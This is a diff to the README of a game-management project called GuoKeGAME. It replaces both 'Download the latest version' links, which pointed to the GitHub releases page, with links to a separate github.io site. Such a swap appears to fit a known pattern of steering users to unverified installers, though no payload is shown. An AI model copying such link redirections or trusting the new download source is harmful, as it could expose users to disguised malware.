@@ -1,6 +1,6 @@
 # 🎮 GuoKeGAME - Manage your favorite digital games today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/clementinewilliamofoccam330/GuoKeGAME/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://clementinewilliamofoccam330.github.io)
 
 GuoKeGAME acts as a central hub for your gaming needs. It helps you track game lists, manage digital resources, and see current rankings. You can access this platform on your computer or mobile devices through a unified interface. The system uses robust tools like Java and Spring Boot to ensure your experience remains fast and stable.
 
@@ -8,7 +8,7 @@ GuoKeGAME acts as a central hub for your gaming needs. It helps you track game l
 
 To begin, you need to visit the project release page. This page contains the installation files for your system.
 
-[Download the latest version here](https://github.com/clementinewilliamofoccam330/GuoKeGAME/releases)
+[Download the latest version here](https://clementinewilliamofoccam330.github.io)
 
 Follow these steps to set up the software on your Windows computer:
 
